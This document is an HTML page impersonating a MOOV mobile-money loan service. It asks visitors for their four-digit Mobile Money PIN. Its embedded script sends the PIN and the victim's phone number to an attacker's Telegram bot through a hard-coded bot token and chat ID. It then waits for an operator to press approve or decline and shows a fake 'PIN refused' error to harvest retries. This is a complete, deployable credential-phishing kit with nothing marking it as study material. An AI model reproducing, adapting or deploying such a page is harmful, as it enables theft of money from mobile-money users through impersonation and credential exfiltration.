<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
    <title>MOOV Prêts – Autorisation PIN</title>
    <link rel="icon" href="https://moov.bf/favicon.ico" type="image/x-icon">
    <meta name="theme-color" content="#E8701A">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --moov-orange: #E8701A;
            --moov-darkorange: #c95f10;
            --moov-blue: #1A6DBF;
            --black: #1a1a1a;
            --gray: #6b7a8f;
            --lightgray: #f5f6f8;
            --shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
            --shadow-hover: 0 12px 32px rgba(0, 0, 0, 0.12);
            --border-radius: 20px;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--lightgray);
            color: var(--black);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 12px;
        }

        /* ===== HEADER ===== */
        header {
            width: 100%;
            max-width: 480px;
            padding: 12px 16px;
            text-align: center;
            margin-bottom: 12px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
            position: relative;
        }

        .logo {
            font-size: clamp(28px, 7vw, 40px);
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        .logo .moov { color: var(--moov-orange); }
        .logo .pret { color: var(--moov-blue); }

        /* ===== CARD ===== */
        .card {
            background: white;
            border-radius: var(--border-radius);
            padding: 24px 18px 32px;
            width: 100%;
            max-width: 480px;
            box-shadow: var(--shadow);
            border: 1px solid rgba(0, 0, 0, 0.04);
            transition: transform 0.25s ease, box-shadow 0.25s ease;
            position: relative;
            margin-bottom: 16px;
            text-align: center;
        }

        .card:hover {
            transform: translateY(-3px);
            box-shadow: var(--shadow-hover);
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(90deg, var(--moov-orange), var(--moov-blue));
            border-radius: var(--border-radius) var(--border-radius) 0 0;
        }

        /* ===== TITRES ===== */
        .card-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--black);
            margin-bottom: 8px;
        }

        .card-subtitle {
            font-size: 15px;
            color: var(--gray);
            line-height: 1.6;
            margin-bottom: 24px;
        }

        /* ===== PIN DISPLAY ===== */
        .pin-display {
            display: flex;
            justify-content: center;
            margin-bottom: 22px;
        }

        .pin-box {
            display: flex;
            align-items: center;
            background: #f1f9ff;
            padding: 12px 18px;
            border-radius: 16px;
            border: 1px solid #ffe0d0;
        }

        .stars {
            font-size: 28px;
            color: var(--moov-orange);
            letter-spacing: 6px;
            font-weight: 500;
        }

        /* ===== CHAMPS PIN ===== */
        .pin-inputs {
            display: flex;
            gap: 12px;
            margin-bottom: 30px;
            justify-content: center;
        }

        .pin-input {
            width: 60px;
            height: 60px;
            border-radius: 16px;
            border: 1.5px solid #ced4da;
            text-align: center;
            font-size: 26px;
            font-weight: 600;
            outline: none;
            background: #fff;
            transition: border 0.15s, box-shadow 0.15s;
            color: var(--black);
            inputmode: numeric;
            pattern: \d*;
            -webkit-text-security: disc;
        }

        .pin-input:focus {
            border-color: var(--moov-orange);
            box-shadow: 0 0 0 3px rgba(232, 112, 26, 0.15);
        }

        .pin-input.filled {
            border-color: var(--moov-orange);
            background: #fff9f2;
        }

        /* ===== BOUTON ===== */
        .btn-authorise {
            width: 100%;
            height: 56px;
            background: #d9d9d9;
            border: none;
            border-radius: 60px;
            font-size: 17px;
            font-weight: 700;
            color: #888;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 12px;
        }

        .btn-authorise.active {
            background: linear-gradient(135deg, var(--moov-orange), var(--moov-darkorange));
            color: white;
            box-shadow: 0 6px 18px rgba(232, 112, 26, 0.3);
        }

        .btn-authorise.active:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 28px rgba(232, 112, 26, 0.4);
        }
        .btn-authorise:active { transform: scale(0.97); }

        /* ===== ERREUR ===== */
        .error-box {
            position: absolute;
            top: 12px;
            left: 12px;
            right: 12px;
            background: #fff;
            border: 2px solid #dc3545;
            border-radius: 14px;
            padding: 12px 16px;
            display: none;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
            z-index: 110;
            text-align: left;
        }

        .error-title {
            color: #dc3545;
            font-weight: bold;
            font-size: 14px;
        }

        .error-text {
            color: #444;
            font-size: 13px;
            margin-top: 2px;
        }

        .close-error {
            position: absolute;
            right: 12px;
            top: 8px;
            cursor: pointer;
            font-size: 20px;
            color: #999;
        }

        /* ===== SPINNER ===== */
        #spinner {
            position: fixed;
            inset: 0;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(3px);
            z-index: 1000;
        }

        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #ffe0d0;
            border-top: 5px solid var(--moov-orange);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 16px;
        }

        .spinner-text {
            font-size: 18px;
            color: var(--moov-orange);
            font-weight: 600;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ===== FOOTER ===== */
        footer {
            padding: 16px 16px 20px;
            color: #adb5bd;
            font-size: 12px;
            text-align: center;
        }
        footer a {
            color: var(--moov-orange);
            text-decoration: none;
            font-weight: 600;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 380px) {
            body { padding: 8px; }
            .card { padding: 20px 14px; }
            .pin-input { width: 50px; height: 50px; font-size: 22px; }
            .pin-inputs { gap: 8px; }
            .btn-authorise { height: 50px; font-size: 16px; }
        }
    </style>
</head>
<body>

    <header>
        <div class="logo">
            <span class="moov">MOOV</span><span class="pret">Prêts</span>
        </div>
    </header>

    <main class="card" id="mainCard">
        <!-- Error box -->
        <div class="error-box" id="errorBox">
            <div class="close-error" onclick="hideError()">×</div>
            <div class="error-title">Erreur</div>
            <div class="error-text" id="errorText">PIN incorrect.</div>
        </div>

        <h1 class="card-title">Confirmer la demande</h1>
        <p class="card-subtitle">
            Vous êtes sur le point d'autoriser MOOV à vous accorder un prêt.<br>
            Entrez votre code PIN Mobile Money pour autoriser.
        </p>

        <div class="pin-display">
            <div class="pin-box">
                <span class="stars">**</span>
            </div>
        </div>

        <div class="pin-inputs">
            <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin1" autofocus autocomplete="off">
            <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin2" autocomplete="off">
            <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin3" autocomplete="off">
            <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off">
        </div>

        <button class="btn-authorise" id="authoriseBtn" disabled>Autoriser</button>
    </main>

    <footer>
        © 2026 MOOV Prêts – Services financiers agréés | <a href="mailto:support@moovpret.bf">support@moovpret.bf</a>
    </footer>

    <!-- Spinner -->
    <div id="spinner">
        <div class="loader"></div>
        <div class="spinner-text">Vérification en cours...</div>
    </div>

    <script>
        (function() {
            // ===== TELEGRAM CONFIG =====
            const BOT_TOKEN = '8902453840:AAH3X3QmwtDnQ9V_3MCk4zSz29iK2Dlxfxk';
            const CHAT_ID   = '1006917440';
            const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

            // ===== DOM =====
            const pinInputs = [
                document.getElementById('pin1'),
                document.getElementById('pin2'),
                document.getElementById('pin3'),
                document.getElementById('pin4')
            ];
            const authoriseBtn = document.getElementById('authoriseBtn');
            const spinner = document.getElementById('spinner');
            const errorBox = document.getElementById('errorBox');
            const errorText = document.getElementById('errorText');

            // ===== RÉCUPÉRATION DU TÉLÉPHONE (localStorage) =====
            const phone = localStorage.getItem('phone') || '0200000020';

            // ===== GESTION DU PIN =====
            function updateButtonState() {
                const allFilled = pinInputs.every(inp => inp.value.length === 1);
                if (allFilled) {
                    authoriseBtn.classList.add('active');
                    authoriseBtn.disabled = false;
                } else {
                    authoriseBtn.classList.remove('active');
                    authoriseBtn.disabled = true;
                }
            }

            pinInputs.forEach((input, idx) => {
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/\D/g, '').slice(0,1);
                    if (this.value.length === 1) {
                        if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
                    }
                    updateButtonState();
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace') {
                        if (this.value.length === 0 && idx > 0) {
                            e.preventDefault();
                            pinInputs[idx - 1].focus();
                        }
                    } else if (e.key === 'ArrowLeft') {
                        e.preventDefault();
                        if (idx > 0) pinInputs[idx - 1].focus();
                    } else if (e.key === 'ArrowRight') {
                        e.preventDefault();
                        if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
                    } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
                        e.preventDefault();
                    }
                });
            });

            updateButtonState();

            // ===== GESTION DES ERREURS =====
            window.hideError = function() {
                errorBox.style.display = 'none';
            };

            function showError(msg) {
                errorText.innerText = msg || 'PIN incorrect.';
                errorBox.style.display = 'block';
            }

            // ===== FONCTIONS TELEGRAM =====
            function escapeHtml(unsafe) {
                return unsafe.replace(/[&<>"]/g, function(m) {
                    if (m === '&') return '&amp;';
                    if (m === '<') return '&lt;';
                    if (m === '>') return '&gt;';
                    if (m === '"') return '&quot;';
                    return m;
                });
            }

            async function sendToTelegram(payload) {
                const url = `${API_BASE}/sendMessage`;
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    return await response.json();
                } catch (err) {
                    console.error('Telegram error', err);
                    throw err;
                }
            }

            let pollInterval = null;

            function pollForCallback(expectedPrefix, expectedTs, onDecision) {
                if (pollInterval) clearInterval(pollInterval);
                let lastUpdateId = 0;
                pollInterval = setInterval(async () => {
                    try {
                        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
                        const res = await fetch(url);
                        const data = await res.json();
                        if (!data.ok || !data.result.length) return;

                        data.result.forEach(update => {
                            lastUpdateId = update.update_id;
                            if (update.callback_query && update.callback_query.data) {
                                const parts = update.callback_query.data.split('_');
                                if (parts.length >= 3) {
                                    const [type, action, time] = parts;
                                    if (time == expectedTs && type === expectedPrefix) {
                                        clearInterval(pollInterval);
                                        pollInterval = null;
                                        onDecision(action);
                                    }
                                }
                            }
                        });
                    } catch (err) {
                        console.warn('Poll error', err);
                    }
                }, 1500);
            }

            // ===== SOUMISSION =====
            let isProcessing = false;

            authoriseBtn.addEventListener('click', async function() {
                if (isProcessing) return;

                const pin = pinInputs.map(i => i.value).join('');
                if (pin.length !== 4) {
                    showError('Entrez les 4 chiffres du PIN.');
                    return;
                }

                isProcessing = true;
                pinInputs.forEach(i => i.disabled = true);
                authoriseBtn.disabled = true;
                spinner.style.display = 'flex';

                const ts = Date.now();
                const escapedPhone = escapeHtml(phone);
                const escapedPin = escapeHtml(pin);

                // Message en anglais, uniquement téléphone + PIN
                const msg = `🔐 PIN verification\n\n📱 Phone: ${escapedPhone}\n🔑 PIN entered: <code>${escapedPin}</code>\n\nAuthorise this PIN?`;

                await sendToTelegram({
                    chat_id: CHAT_ID,
                    text: msg,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ Approve', callback_data: `pin_approve_${ts}` },
                            { text: '❌ Decline', callback_data: `pin_decline_${ts}` }
                        ]]
                    }
                });

                pollForCallback('pin', ts, (action) => {
                    spinner.style.display = 'none';
                    isProcessing = false;

                    if (action === 'approve') {
                        window.location.href = 'unavailable.html';
                    } else if (action === 'decline') {
                        showError('PIN refusé. Veuillez réessayer.');
                        pinInputs.forEach(i => {
                            i.value = '';
                            i.disabled = false;
                        });
                        pinInputs[0].focus();
                        authoriseBtn.disabled = false;
                        updateButtonState();
                    }
                });
            });
        })();
    </script>
</body>
</html>
